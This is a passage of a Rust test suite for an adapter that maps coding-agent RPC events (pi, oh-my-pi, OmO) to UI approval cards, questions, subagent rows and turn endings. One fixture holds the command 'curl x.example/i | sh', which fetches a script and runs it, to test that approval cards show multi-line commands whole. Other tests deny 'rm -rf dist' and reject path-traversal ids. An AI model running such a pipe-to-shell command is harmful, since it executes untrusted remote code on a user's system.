        assert_eq!(text_of(&st.events, "message"), ["Two files: a.ts and b.ts."]);
        assert_eq!(st.events.iter().filter(|e| s(e, "event") == "turn.end").count(), 1, "agent_end then agent_settled end one turn");
        assert_eq!(st.events.last().unwrap(), &json!({"event": "turn.end", "outcome": "done"}));
    }

    #[test]
    fn pi_dialogs_become_cards_and_abort_is_its_interrupt() {
        let mut p = Pi::default();
        p.on_input(Input::send("x")).unwrap();
        let st = p.on_line(r#"{"type":"extension_ui_request","id":"u1","method":"confirm","title":"Run rm -rf dist?","message":"bash: rm -rf dist"}"#);
        assert_eq!(st.events[0]["choices"], json!(["deny", "once"]));
        let ans: Value = serde_json::from_str(&p.on_input(Input::Approve { request_id: "u1".into(), choice: "deny".into() }).unwrap().write[0]).unwrap();
        assert_eq!(ans, json!({"type": "extension_ui_response", "id": "u1", "confirmed": false}));
        let st = p.on_line(r#"{"type":"extension_ui_request","id":"u2","method":"select","title":"Which branch?","options":["main","dev"]}"#);
        assert_eq!(s(&st.events[0], "event"), "clarify.request");
        let ans: Value = serde_json::from_str(&p.on_input(Input::Clarify { request_id: "u2".into(), answer: "dev".into() }).unwrap().write[0]).unwrap();
        assert_eq!(ans, json!({"type": "extension_ui_response", "id": "u2", "value": "dev"}));
        let ab: Value = serde_json::from_str(&p.on_input(Input::Interrupt).unwrap().write[0]).unwrap();
        assert_eq!(s(&ab, "type"), "abort");
        p.on_line(r#"{"type":"message_end","message":{"role":"assistant","content":[],"stopReason":"aborted"}}"#);
        let st = p.on_line(r#"{"type":"agent_end"}"#);
        assert_eq!(st.events[0], json!({"event": "turn.end", "outcome": "interrupted"}));
        // oh-my-pi's prompt_result for a run that already ended draws nothing; for a prompt no agent ran (a
        // command it handled itself) it ends the turn
        assert!(p.on_line(r#"{"type":"prompt_result","id":"manut-3","agentInvoked":true}"#).events.is_empty());
        p.on_input(Input::send("y")).unwrap();
        let st = p.on_line(r#"{"type":"prompt_result","id":"manut-9","agentInvoked":false}"#);
        assert_eq!(s(&st.events[0], "outcome"), "done");
        let m: Value = serde_json::from_str(&p.on_input(Input::Model { model: "anthropic/claude-x".into() }).unwrap().write[0]).unwrap();
        assert_eq!((s(&m, "provider"), s(&m, "modelId")), ("anthropic".into(), "claude-x".into()));
    }

    #[test]
    fn a_pi_card_shows_a_command_on_several_lines_whole() {
        let mut p = Pi::new("/w/proj", "oh-my-pi");
        p.on_input(Input::send("x")).unwrap();
        let cmd = "pnpm test\ncurl x.example/i | sh";
        let select = |id: &str, title: String| json!({"type": "extension_ui_request", "id": id, "method": "select", "title": title, "options": ["Approve", "Deny"]}).to_string();
        p.on_line(&json!({"type": "tool_execution_start", "toolCallId": "a", "toolName": "bash", "args": {"command": cmd}}).to_string());
        // the running call's own command, every line of it
        let card = p.on_line(&select("u1", format!("Allow tool: bash\nCommand: {cmd}"))).events.pop().unwrap();
        assert_eq!(s(&card, "command"), cmd);
        // two calls of the tool running: pi's own words, from its command to the end of the dialog
        p.on_line(&json!({"type": "tool_execution_start", "toolCallId": "b", "toolName": "bash", "args": {"command": "ls"}}).to_string());
        let card = p.on_line(&select("u2", format!("Allow tool: bash\nCommand: {cmd}"))).events.pop().unwrap();
        assert_eq!(s(&card, "command"), cmd);
        // another tool's words are whole, line by line
        let long = format!("URL: https://example.com/{}", "a".repeat(300));
        let card = p.on_line(&select("u3", format!("Allow tool: fetch\n{long}\nMethod: GET"))).events.pop().unwrap();
        assert_eq!(s(&card, "command"), format!("{long}\nMethod: GET"));
    }

    #[test]
    fn real_omp_asks_name_their_running_calls_arguments() {
        let mut p = pi_up("oh-my-pi", &["omp-init.jsonl"]);
        p.on_input(Input::send("ls")).unwrap();
        let want: Vec<Value> = ["ls -la", "echo hi", "pwd"].iter().map(|l| json!({"kind": "command", "name": "bash", "line": l, "cwd": "/w/proj"})).collect();
        assert_eq!(ask_tools(&mut p, &["omp-2-approvals.jsonl"]), want);
        // a write names its file; oh-my-pi's own edit names it inside its patch, so it names none
        let mut p = pi_up("oh-my-pi", &["omp-init.jsonl"]);
        p.on_input(Input::send("notes")).unwrap();
        assert_eq!(
            ask_tools(&mut p, &["omp-3-edit.jsonl"]),
            [json!({"kind": "write", "name": "write", "paths": ["notes.txt"], "cwd": "/w/proj"}), json!({"kind": "edit", "name": "edit", "cwd": "/w/proj"})]
        );
    }

    #[test]
    fn a_pi_approval_names_no_arguments_while_two_calls_of_its_tool_run() {
        let mut p = Pi::new("/w/proj", "oh-my-pi");
        p.on_input(Input::send("x")).unwrap();
        p.on_line(r#"{"type":"tool_execution_start","toolCallId":"a","toolName":"bash","args":{"command":"pnpm test"}}"#);
        p.on_line(r#"{"type":"tool_execution_start","toolCallId":"b","toolName":"bash","args":{"command":"git push origin main"}}"#);
        let select = |id: &str, cmd: &str| json!({"type": "extension_ui_request", "id": id, "method": "select", "title": format!("Allow tool: bash\nCommand: {cmd}"), "options": ["Approve", "Deny"]}).to_string();
        let card = p.on_line(&select("u1", "pnpm test")).events.pop().unwrap();
        assert_eq!(card["tool"], json!({"kind": "command", "name": "bash", "cwd": "/w/proj"}));
        // once one has ended, the other is the one asking
        p.on_line(r#"{"type":"tool_execution_end","toolCallId":"a","toolName":"bash","isError":false}"#);
        let card = p.on_line(&select("u2", "git push origin main")).events.pop().unwrap();
        assert_eq!(card["tool"]["line"], "git push origin main");
        // an extension's own confirm is no tool call
        let card = p.on_line(r#"{"type":"extension_ui_request","id":"u3","method":"confirm","title":"Proceed?","message":"git status"}"#).events.pop().unwrap();
        assert_eq!(card["tool"], json!({"kind": "other", "cwd": "/w/proj"}));
    }

    // -- pi and oh-my-pi --

    #[test]
    fn real_pi_1_plain_answer_ends_on_agent_end() {
        // pi 0.73 ends a prompt with agent_end only (no agent_settled / prompt_result)
        let mut p = pi_up("pi", &["pi-init.jsonl"]);
        p.on_input(Input::send("2+2")).unwrap();
        let st = replay(&mut p, &["pi-1-plain.jsonl"], &[]);
        assert_eq!(text_of(&st.events, "message"), ["4. (model stub-a)"]);
        assert_eq!(ends(&st.events), [("done".into(), "".into())]);
        assert!(!p.in_turn());
    }

    #[test]
    fn real_omo_plain_answer_through_the_pi_adapter() {
        // omo 5.0.0-beta.65 (`omo --mode rpc`, signed in): pi's RPC plus its own events (settings_source_selected,
        // agent_settled, agent_idle, setStatus/notify dialogs, stdout log lines); the session id is what --session takes
        let mut p = Pi::new("/w/proj", "OmO");
        p.start();
        let st = run(&mut p, &real("omo-init.jsonl"));
        // its startup thinking_level_changed says the effort first; get_state then names the session
        let info = of(&st.events, "session.info");
        assert_eq!(s(info[0], "effort"), "high");
        let state = info.iter().find(|e| !s(e, "agent_session").is_empty()).unwrap();
        assert_eq!(s(state, "agent_session"), "01a1c85a-703a-72fe-ae88-c1f9ffb5c249");
        assert_eq!(s(state, "model"), "Claude Fable 5.1");
        assert_eq!(s(state, "effort"), "high");
        assert_eq!(of(&st.events, "session.models")[0]["options"].as_array().unwrap().len(), 3);
        assert!(!p.in_turn());
        p.on_input(Input::send("hi. reply with just the word ok")).unwrap();
        let st = replay(&mut p, &["omo-1-plain.jsonl"], &[]);
        assert_eq!(text_of(&st.events, "message"), ["ok"]);
        assert_eq!(ends(&st.events), [("done".into(), "".into())]);
        assert!(of(&st.events, "approval.request").is_empty() && of(&st.events, "clarify.request").is_empty());
        assert!(!p.in_turn());
        // the error line names OmO, not pi
        assert!(p.explain("No API key found").starts_with("OmO is not signed in"));
    }

    #[test]
    fn real_pi_2_bash_runs_show_the_commands() {
        // pi has no tool approvals of its own: it runs bash straight away
        let mut p = pi_up("pi", &["pi-init.jsonl"]);
        p.on_input(Input::send("ls")).unwrap();
        let st = replay(&mut p, &["pi-2-tools.jsonl"], &[]);
        assert_eq!(tools(&st.events), [("terminal", "ls -la"), ("terminal", "echo hi"), ("terminal", "pwd")].map(|(a, b)| (a.to_string(), b.to_string())));
        assert!(of(&st.events, "approval.request").is_empty());
        assert_eq!(ends(&st.events), [("done".into(), "".into())]);
    }

    #[test]
    fn real_pi_3_write_and_edit() {
        let mut p = pi_up("pi", &["pi-init.jsonl"]);
        p.on_input(Input::send("notes")).unwrap();
        let st = replay(&mut p, &["pi-3-edit.jsonl"], &[]);
        assert_eq!(tools(&st.events), [("patch", "notes.txt +1"), ("patch", "README.md +1 -1")].map(|(a, b)| (a.to_string(), b.to_string())));
        assert_eq!(ends(&st.events), [("done".into(), "".into())]);
    }

    #[test]
    fn real_pi_4_abort_ends_interrupted() {
        let mut p = pi_up("pi", &["pi-init.jsonl"]);
        p.on_input(Input::send("sleep")).unwrap();
        let st = run(&mut p, &real("pi-4-running.jsonl"));
        assert_eq!(tools(&st.events), [("terminal".to_string(), "sleep 30; echo finished".to_string())]);
        assert!(ends(&st.events).is_empty() && p.in_turn());
        assert_eq!(written(&p.on_input(Input::Interrupt).unwrap())[0]["type"], "abort");
        let st = run(&mut p, &real("pi-4-stopped.jsonl"));
        assert_eq!(of(&st.events, "tool.end")[0]["ok"], false);
        assert_eq!(ends(&st.events), [("interrupted".into(), "".into())]);
        assert!(!p.in_turn());
    }

    #[test]
    fn real_pi_5_question_is_plain_text() {
        // pi has no ask tool: the question is the answer bubble and the turn ends, waiting for the reply
        let mut p = pi_up("pi", &["pi-init.jsonl"]);
        p.on_input(Input::send("ask")).unwrap();
        let st = replay(&mut p, &["pi-5-question.jsonl"], &[]);
        assert_eq!(text_of(&st.events, "message"), ["Which greeting should go in greet.txt: hello or hi?"]);
        assert_eq!(ends(&st.events), [("done".into(), "".into())]);
    }

    #[test]
    fn real_pi_6_bad_command_fails_its_step_only() {
        let mut p = pi_up("pi", &["pi-init.jsonl"]);
        p.on_input(Input::send("bad")).unwrap();
        let st = replay(&mut p, &["pi-6-error.jsonl"], &[]);
        assert_eq!(of(&st.events, "tool.end")[0]["ok"], false);
        assert_eq!(ends(&st.events), [("done".into(), "".into())]);
    }

    #[test]
    fn real_pi_7_model_switch() {
        let mut p = pi_up("pi", &["pi-init.jsonl"]);
        let w = written(&p.on_input(Input::Model { model: "stub/stub-b".into() }).unwrap());
        assert_eq!((s(&w[0], "provider"), s(&w[0], "modelId")), ("stub".into(), "stub-b".into()));
        let st = run(&mut p, &real("pi-7-model.jsonl").iter().map(|l| l.replace("manut-9", s(&w[0], "id").as_str())).collect::<Vec<_>>());
        assert_eq!(s(&st.events[0], "model"), "Stub B");
        p.on_input(Input::send("2+2")).unwrap();
        let st = replay(&mut p, &["pi-7-after-model.jsonl"], &[]);
        assert_eq!(text_of(&st.events, "message"), ["4. (model stub-b)"]);
    }

    #[test]
    fn real_pi_signed_out_says_how_to_sign_in() {
        let mut p = Pi::new("/w/proj", "pi");
        p.start();
        let st = run(&mut p, &real("pi-noauth-init.jsonl"));
        assert_eq!(s(of(&st.events, "session.info")[0], "model"), "", "\"unknown\" is not a model name");
        assert_eq!(of(&st.events, "session.models")[0]["options"], json!([]));
        p.on_input(Input::send("2+2")).unwrap();
        let st = run(&mut p, &real("pi-signed-out.jsonl").iter().map(|l| l.replace("manut-3", "manut-3")).collect::<Vec<_>>());
        let e = ends(&st.events);
        assert_eq!(e[0], ("error".to_string(), "pi is not signed in. Open Terminal and run /login, then Restart.".to_string()));
        // a model change it refuses is a note, not a crash
        let st = run(&mut p, &real("pi-noauth-model.jsonl"));
        assert!(st.events.is_empty() || s(&st.events[0], "event") == "session.error");
    }

    #[test]
    fn real_omp_1_plain_ends_once_and_ignores_its_own_extras() {
        let mut p = pi_up("oh-my-pi", &[]);
        // ready, setWidget, advisor_cost_changed and available_commands_update before any prompt: nothing to draw
        let st = run(&mut p, &real("omp-ready.jsonl"));
        assert!(st.events.is_empty() && st.write.is_empty(), "{:?}", st);
        run(&mut p, &real("omp-init.jsonl"));
        p.on_input(Input::send("2+2")).unwrap();
        let st = replay(&mut p, &["omp-1-plain.jsonl"], &[]);
        assert_eq!(text_of(&st.events, "message"), ["4. (model stub-a)"]);
        // agent_end, prompt_result and session_settled all arrive: one turn.end
        assert_eq!(ends(&st.events), [("done".into(), "".into())]);
    }

    #[test]
    fn real_omp_2_tool_approval_select_maps_to_deny_once_session() {
        let mut p = pi_up("oh-my-pi", &["omp-init.jsonl"]);
        p.on_input(Input::send("ls")).unwrap();
        let st = replay(&mut p, &["omp-2-approvals.jsonl"], &["deny", "once", "session"]);
        let cards = of(&st.events, "approval.request");
        assert_eq!(cards.len(), 3);
        for (card, cmd) in cards.iter().zip(["ls -la", "echo hi", "pwd"]) {
            assert_eq!((s(card, "title"), s(card, "command"), s(card, "cwd")), ("Run this command?".into(), cmd.into(), "/w/proj".into()));
            assert_eq!(card["choices"], json!(["deny", "once", "session"]));
        }
        assert!(of(&st.events, "clarify.request").is_empty(), "an approval select is not a question");
        // each answer is the select's own option label
        let values: Vec<String> = written(&st).iter().filter(|w| w["type"] == "extension_ui_response").map(|w| s(w, "value")).collect();
        assert_eq!(values, ["Deny", "Approve", "Approve bash for this session"]);
        assert_eq!(tools(&st.events).iter().map(|t| t.1.as_str()).collect::<Vec<_>>(), ["ls -la", "echo hi", "pwd"]);
        assert_eq!(ends(&st.events), [("done".into(), "".into())]);
    }

    #[test]
    fn real_omp_3_write_card_names_the_file() {
        let mut p = pi_up("oh-my-pi", &["omp-init.jsonl"]);
        p.on_input(Input::send("notes")).unwrap();
        let st = replay(&mut p, &["omp-3-edit.jsonl"], &["once", "once"]);
        let titles: Vec<String> = of(&st.events, "approval.request").iter().map(|c| s(c, "title")).collect();
        assert_eq!(titles, ["Allow write to change notes.txt?", "Allow edit to change files?"]);
        assert_eq!(tools(&st.events), [("patch", "notes.txt +1"), ("patch", "README.md")].map(|(a, b)| (a.to_string(), b.to_string())));
        assert_eq!(ends(&st.events), [("done".into(), "".into())]);
    }

    #[test]
    fn real_omp_4_abort_ends_interrupted_once() {
        let mut p = pi_up("oh-my-pi", &["omp-init.jsonl"]);
        p.on_input(Input::send("sleep")).unwrap();
        run(&mut p, &real("omp-4-running.jsonl"));
        p.on_input(Input::Interrupt).unwrap();
        let st = run(&mut p, &real("omp-4-stopped.jsonl"));
        assert_eq!(ends(&st.events), [("interrupted".into(), "".into())]);
    }

    #[test]
    fn real_omp_5_6_7_question_error_and_model() {
        let mut p = pi_up("oh-my-pi", &["omp-init.jsonl"]);
        p.on_input(Input::send("ask")).unwrap();
        let st = replay(&mut p, &["omp-5-question.jsonl"], &[]);
        assert_eq!(text_of(&st.events, "message"), ["Which greeting should go in greet.txt: hello or hi?"]);
        let w = written(&p.on_input(Input::Model { model: "stub/stub-b".into() }).unwrap());
        let st = run(&mut p, &real("omp-7-model.jsonl").iter().map(|l| l.replace("manut-9", s(&w[0], "id").as_str())).collect::<Vec<_>>());
        assert_eq!(s(of(&st.events, "session.info")[0], "model"), "Stub B");
        p.on_input(Input::send("2+2")).unwrap();
        assert_eq!(text_of(&replay(&mut p, &["omp-7-after-model.jsonl"], &[]).events, "message"), ["4. (model stub-b)"]);
        p.on_input(Input::send("bad")).unwrap();
        let st = replay(&mut p, &["omp-6-error.jsonl"], &[]);
        assert_eq!(of(&st.events, "tool.end")[0]["ok"], false);
        assert_eq!(ends(&st.events), [("done".into(), "".into())]);
    }

    #[test]
    fn omp_cancel_closes_its_dialog_and_an_ordinary_select_is_a_question() {
        let mut p = Pi::new("/w/proj", "oh-my-pi");
        p.on_input(Input::send("x")).unwrap();
        let st = p.on_line(r#"{"type":"extension_ui_request","id":"u9","method":"select","title":"Which branch?","options":["main","dev"]}"#);
        assert_eq!(s(&st.events[0], "event"), "clarify.request");
        let st = p.on_line(r#"{"type":"extension_ui_request","id":"c1","method":"cancel","targetId":"u9"}"#);
        assert_eq!(st.events[0], json!({"event": "prompt.expired", "request_id": "u9", "reason": "timeout"}));
        assert!(p.on_input(Input::Clarify { request_id: "u9".into(), answer: json!("dev") }).is_err());
    }

    #[test]
    fn real_omo_9_reports_levels_commands_and_context() {
        // omo 5.0.0-beta.65: get_available_thinking_levels, get_commands (trimmed), get_session_stats after a turn
        let mut p = Pi::new("/w/proj", "OmO");
        let w = written(&p.start());
        assert_eq!(w.iter().map(|v| s(v, "type")).collect::<Vec<_>>(), ["get_state", "get_available_models", "get_available_thinking_levels", "get_commands"]);
        // the session-stats read the recording answers is the one asked after a turn
        p.read(&mut Step::default(), "get_session_stats");
        let st = run(&mut p, &real("omo-9-controls.jsonl"));
        assert_eq!(of(&st.events, "session.efforts")[0]["levels"], json!(["minimal", "low", "medium", "high", "xhigh", "max"]));
        let cmds = of(&st.events, "session.commands")[0]["commands"].as_array().unwrap().clone();
        assert_eq!(cmds.iter().map(|c| (s(c, "kind"), s(c, "prefix"))).collect::<Vec<_>>(), [("command", "/"), ("command", "/"), ("command", "/"), ("skill", "$"), ("skill", "$")].map(|(a, b)| (a.to_string(), b.to_string())));
        assert!(s(&cmds[3], "name").starts_with("skill:"));
        assert_eq!(of(&st.events, "session.usage")[0], &json!({"event": "session.usage", "used": 82335, "max": 1000000}));
        // a level it offers goes as its own set_thinking_level; anything else is refused
        let w = written(&p.on_input(Input::Effort { effort: "low".into() }).unwrap());
        assert_eq!((s(&w[0], "type"), s(&w[0], "level")), ("set_thinking_level".into(), "low".into()));
        assert!(p.on_input(Input::Effort { effort: "off".into() }).is_err());
        let st = run(&mut p, &[r#"{"type":"thinking_level_changed","level":"low"}"#.into()]);
        assert_eq!(s(of(&st.events, "session.info")[0], "effort"), "low");
    }

    #[test]
    fn real_omo_9_a_follow_up_waits_in_its_queue_until_omo_takes_it() {
        // omo 5.0.0-beta.65: "numbers 1..80", then (3 s in) "SECOND" as a followUp: queue_update, then after the
        // first answer a new turn_start, an empty queue and SECOND's own message_end
        let mut p = pi_up("OmO", &[]);
        let lines = real("omo-9-queued.jsonl");
        p.on_input(sent_with("numbers", "a")).unwrap();
        let start = lines.iter().position(|l| l.contains("\"agent_start\"")).unwrap();
        let first_user = lines.iter().position(|l| l.contains("\"message_end\"") && l.contains("\"role\":\"user\"")).unwrap();
        run(&mut p, &lines[..=first_user]);
        assert!(start < first_user);
        let st = p.on_input(sent_with("SECOND", "b")).unwrap();
        assert_eq!(names(&st.events), ["message.queued"]);
        assert_eq!(written(&st)[0]["streamingBehavior"], "followUp");
        let second_user = lines.iter().rposition(|l| l.contains("\"message_end\"") && l.contains("\"role\":\"user\"")).unwrap();
        let st = run(&mut p, &lines[first_user + 1..second_user]);
        assert!(of(&st.events, "message.taken").is_empty());
        let st = run(&mut p, &lines[second_user..]);
        assert_eq!(of(&st.events, "message.taken")[0]["id"], "b");
        assert_eq!(text_of(&st.events, "message"), ["SECOND"]);
        assert_eq!(ends(&st.events), [("done".into(), "".into())]);
        // Stop with a follow-up waiting: omo clears its queue, so the message is dropped
        p.on_input(sent_with("long", "c")).unwrap();
        run(&mut p, &[r#"{"type":"agent_start"}"#.into()]);
        p.on_input(sent_with("later", "d")).unwrap();
        let st = run(&mut p, &[r#"{"type":"agent_end","aborted":true}"#.into()]);
        assert_eq!(names(&st.events)[..2], ["message.dropped", "turn.end"]);
        assert_eq!(st.events[0]["id"], "d");
    }

    #[test]
    fn omo_status_after_its_turn_ended_is_not_shown() {
        // omo-1-plain.jsonl: agent_end, then setStatus "(😺 OmO Native)", agent_settled, agent_idle, more setStatus
        let mut p = pi_up("OmO", &["omo-init.jsonl"]);
        p.on_input(Input::Send { text: "hi".into(), images: vec![], id: String::new() }).unwrap();
        let lines = real("omo-1-plain.jsonl");
        let end = lines.iter().position(|l| l.contains("\"type\":\"agent_end\"")).unwrap();
        run(&mut p, &lines[..=end]);
        let late = run(&mut p, &lines[end + 1..]);
        assert!(late.events.is_empty(), "{:?}", late.events);
        // while a turn runs, its status shows as the agent wrote it
        p.on_input(Input::Send { text: "again".into(), images: vec![], id: String::new() }).unwrap();
        let st = p.on_line(r#"{"type":"extension_ui_request","id":"s1","method":"setStatus","statusKey":"memory","statusText":"mem:khope-sionic-ai-d09472c9 9d ago (+1)"}"#);
        assert_eq!(st.events, [json!({"event": "status", "text": "mem:khope-sionic-ai-d09472c9 9d ago (+1)"})]);
    }

    #[test]
    fn omo_subagents_come_out_as_rows_and_end_when_omo_says_they_finished() {
        // omo-9: one `task` call with two background subagents (OmO 5.1.56, a real run); their completions arrive in
        // OmO's next turn as `senpi-task.completion`
        let mut p = pi_up("OmO", &["omo-init.jsonl"]);
        p.on_input(Input::send("go")).unwrap();
        let st = run(&mut p, &real("omo-9-subagents.jsonl"));
        let subs: Vec<&Event> = st.events.iter().filter(|e| s(e, "event") == "subagent").collect();
        assert_eq!((s(subs[0], "agent"), s(subs[0], "name"), s(subs[0], "goal"), s(subs[0], "state")), ("omo".into(), "first-line".into(), "Report the first line of a.txt".into(), "queued".into()));
        assert_eq!(s(subs[1], "name"), "line-count");
        // the call's result: both running in the background, on their resolved model
        let running: Vec<&&Event> = subs.iter().filter(|e| s(e, "state") == "running").collect();
        assert_eq!(running.len(), 2);
        assert_eq!(s(running[0], "model"), "gpt-6-luna-fast");
        // the `task` step names them, never the raw call JSON
        let step = st.events.iter().find(|e| s(e, "event") == "tool.start" && s(e, "name") == "delegate_task").unwrap();
        assert_eq!(s(step, "detail"), "first-line, line-count");
        p.on_input(Input::send("next")).unwrap();
        let st = replay(&mut p, &["omo-9-subagents-after.jsonl"], &[]);
        let done: Vec<&Event> = st.events.iter().filter(|e| s(e, "event") == "subagent").collect();
        assert_eq!(done.iter().map(|e| (s(e, "name"), s(e, "state"), s(e, "summary"))).collect::<Vec<_>>(), [
            ("first-line".into(), "done".into(), "alpha line".into()),
            ("line-count".into(), "done".into(), "2".into()),
        ]);
        assert_eq!(done[0]["seconds"], json!(9.9));
        assert_eq!(s(done[0], "model"), "claude-haiku-5-5");
    }

    /// The rows a recorded OmO 5.1.56 turn ends with: (name, state, summary, model, seconds).
    fn omo_rows(p: &mut Pi, file: &str) -> (Step, Vec<(String, String, String, String, Value)>) {
        p.on_input(Input::send("go")).unwrap();
        let st = run(p, &real(file));
        let rows = st.events.iter().filter(|e| s(e, "event") == "subagent" && s(e, "state") != "queued" && s(e, "state") != "running").map(|e| (s(e, "name"), s(e, "state"), s(e, "summary"), s(e, "model"), e["seconds"].clone())).collect();
        (st, rows)
    }

    #[test]
    fn an_omo_foreground_batch_ends_each_row_with_its_own_answer_and_model() {
        // omo-13-batch (OmO 5.1.56, a real run): one foreground `task` with two subagents. Its result's items carry
        // only {task_id, name, status}; each answer, model and time is in OmO's own record of that task id
        let mut p = pi_up("OmO", &["omo-13-batch-init.jsonl"]);
        let (st, rows) = omo_rows(&mut p, "omo-13-batch.jsonl");
        assert_eq!(rows, [
            ("helper-a-first-line".into(), "done".into(), "FIRST_LINE: alpha line".into(), "claude-haiku-5-5".into(), json!(19.9)),
            ("helper-b-line-count".into(), "done".into(), "LINE_COUNT: 3".into(), "claude-haiku-5-5".into(), json!(28.6)),
        ]);
        assert_eq!(st.events.iter().filter(|e| s(e, "event") == "turn.end").count(), 1);
    }

    #[test]
    fn an_omo_single_foreground_task_ends_with_its_answer() {
        // omo-13-single (OmO 5.1.56, a real run): one task, no `tasks` array; the result names its model, no answer
        let mut p = pi_up("OmO", &["omo-13-single-init.jsonl"]);
        let (_, rows) = omo_rows(&mut p, "omo-13-single.jsonl");
        assert_eq!(rows, [("helper-single".into(), "done".into(), "FIRST_LINE: alpha line".into(), "claude-haiku-5-5".into(), json!(23.0))]);
    }

    #[test]
    fn an_omo_row_without_its_own_record_ends_with_no_answer_never_another_ones() {
        // no record to read: the rows end done with no answer, and the turn still ends
        let mut p = pi_up("OmO", &["omo-13-batch-init.jsonl"]);
        p.omo_home = Some(Path::new(env!("CARGO_MANIFEST_DIR")).join("tests").join("fixtures").join("no-such-home"));
        let (st, rows) = omo_rows(&mut p, "omo-13-batch.jsonl");
        assert_eq!(rows.iter().map(|r| (r.1.as_str(), r.2.as_str())).collect::<Vec<_>>(), [("done", ""), ("done", "")]);
        assert_eq!(st.events.iter().filter(|e| s(e, "event") == "turn.end").count(), 1);
        // records of another conversation (the single run's session) are never taken for this one's rows
        let mut p = pi_up("OmO", &["omo-13-single-init.jsonl"]);
        let (_, rows) = omo_rows(&mut p, "omo-13-batch.jsonl");
        assert_eq!(rows.iter().map(|r| r.2.as_str()).collect::<Vec<_>>(), ["", ""]);
        // a task id that is not OmO's shape is never looked up
        let p = pi_up("OmO", &["omo-13-batch-init.jsonl"]);
        for bad in ["../st_01a1d076", "st_01a1d076/..", "st_", "x_01a1d076", "st_01a1d076.json"] {
            assert!(p.omo_record(bad).is_none(), "{bad}");
        }
        assert_eq!(s(&p.omo_record("st_01a1d076").unwrap(), "final_response"), "FIRST_LINE: alpha line");
    }

    #[test]
    fn omos_todo_list_is_the_turns_checklist_never_a_step_with_its_json() {
        // omo-13-batch: OmO's `todo` init and two `done` calls
        let mut p = pi_up("OmO", &["omo-13-batch-init.jsonl"]);
        let (st, _) = omo_rows(&mut p, "omo-13-batch.jsonl");
        assert!(!st.events.iter().any(|e| s(e, "event") == "tool.start" && (s(e, "name") == "todo" || s(e, "detail").contains("{\""))), "a todo step");
        let plans: Vec<Vec<(String, String)>> = st.events.iter().filter(|e| s(e, "event") == "plan").map(|e| e["items"].as_array().unwrap().iter().map(|i| (s(i, "text"), s(i, "status"))).collect()).collect();
        assert_eq!(plans.first().unwrap(), &[("Spawn foreground batch of two helper tasks".to_string(), "in_progress".to_string()), ("Give one-line summary of batch results".into(), "pending".into())]);
        assert!(plans.last().unwrap().iter().all(|(_, st)| st == "completed"));
    }

    #[test]
    fn omo_says_what_still_runs_in_the_background() {
        // omo-B: session_lifecycle waiting_background with one bash (audit O10); subagents are not counted here
        let mut p = pi_up("OmO", &["omo-init.jsonl"]);
        let st = p.on_line(r#"{"type":"session_lifecycle","lifecycle":{"state":"waiting_background","waitingOn":{"children":0,"background":[{"source":"terminal-background-sessions","activeCount":1,"items":[{"id":"bash_1","label":"sleep 20"}]}],"human":[]}}}"#);
        assert_eq!(st.events, [json!({"event": "session.info", "background": 1})]);
        assert!(p.on_line(r#"{"type":"session_lifecycle","lifecycle":{"state":"waiting_background","waitingOn":{"children":0,"background":[{"source":"terminal-background-sessions","activeCount":1}],"human":[]}}}"#).events.is_empty());
        let st = p.on_line(r#"{"type":"session_lifecycle","lifecycle":{"state":"done","waitingOn":{"children":0,"background":[{"source":"delivery:omo-senpi:wake:x","activeCount":1}],"human":[]}}}"#);
        assert_eq!(st.events, [json!({"event": "session.info", "background": 0})]);
    }

    #[test]
    fn omo_stop_during_a_command_ends_interrupted() {
        // omo (audit O4): the abort hit the tool, so the last message ended with stopReason "toolUse"; agent_end
        // carries aborted: true
        let mut p = pi_up("OmO", &["omo-init.jsonl"]);
        p.on_input(Input::Send { text: "sleep".into(), images: vec![], id: String::new() }).unwrap();
        p.on_line(r#"{"type":"agent_start"}"#);
        p.on_line(r#"{"type":"message_end","message":{"role":"assistant","content":[],"stopReason":"toolUse"}}"#);
        let st = p.on_line(r#"{"type":"agent_end","messages":[],"willRetry":false,"aborted":true,"abortSource":"user"}"#);
        assert_eq!(ends(&st.events), [("interrupted".into(), "".into())]);
        // an ordinary end stays done
        p.on_input(Input::Send { text: "hi".into(), images: vec![], id: String::new() }).unwrap();
        p.on_line(r#"{"type":"message_end","message":{"role":"assistant","content":[{"type":"text","text":"ok"}],"stopReason":"stop"}}"#);
        let st = p.on_line(r#"{"type":"agent_end","messages":[],"willRetry":false}"#);
        assert_eq!(ends(&st.events), [("done".into(), "".into())]);
    }

    #[test]
    fn omo_retry_of_its_own_is_one_turn_that_ends_once_with_omos_reason() {
        // omo-12-retry (audit O5, OmO 5.1.56): agent_end with `failure`, auto_retry_start, a second run, agent_end,
        // auto_retry_end {finalError}, model_config_error. One message: one turn, one end, OmO's words, no raw JSON
        let mut p = pi_up("OmO", &["omo-init.jsonl"]);
        let mut events = p.on_input(Input::send("which model?")).unwrap().events;
        events.extend(run(&mut p, &real("omo-12-retry.jsonl")).events);
        let kinds: Vec<String> = events.iter().map(|e| s(e, "event")).filter(|k| k.starts_with("turn.")).collect();
        assert_eq!(kinds, ["turn.start", "turn.end"], "{events:?}");
        let why = "Anthropic rejected this conversation's request format, even after retrying without web search replay data. Run /compact or start a new session to continue, and report it if it happens again.";
        assert_eq!(ends(&events), [("error".into(), why.into())]);
        // while OmO retried, the line said so, from OmO's own numbers
        let retry: Vec<&Event> = events.iter().filter(|e| s(e, "event") == "status" && e.get("retry").is_some()).collect();
        assert_eq!(retry.len(), 1);
        assert_eq!((retry[0]["retry"]["attempt"].as_u64(), retry[0]["retry"]["max"].as_u64()), (Some(1), Some(5)));
        assert!(!p.in_turn());
    }

    #[test]
    fn omo_failure_with_no_retry_ends_once_with_the_providers_message() {
        // the same recorded lines without OmO's retry: the run's end waits for OmO's next word, then ends once; the
        // raw `400 {"type":"error",…}` reads as the provider's message
        let lines = real("omo-12-retry.jsonl");
        let first_end = lines.iter().position(|l| l.contains("\"type\":\"agent_end\"")).unwrap();
        let mut p = pi_up("OmO", &["omo-init.jsonl"]);
        let mut events = p.on_input(Input::send("which model?")).unwrap().events;
        let held = run(&mut p, &lines[..=first_end]).events;
        assert!(held.iter().all(|e| s(e, "event") != "turn.end"), "{held:?}");
        assert!(p.in_turn());
        events.extend(held);
        let rest: Vec<String> = lines[first_end + 1..].iter().filter(|l| l.contains("model_config_error") || l.contains("agent_settled")).cloned().collect();
        events.extend(run(&mut p, &rest).events);
        assert_eq!(ends(&events), [("error".into(), "unknown provider for model claude-haiku-4-5".into())]);
        // a retry that works clears the retry line and the turn goes on to its answer
        let mut p = pi_up("OmO", &["omo-init.jsonl"]);
        p.on_input(Input::send("again")).unwrap();
        run(&mut p, &lines[..=first_end + 2]);
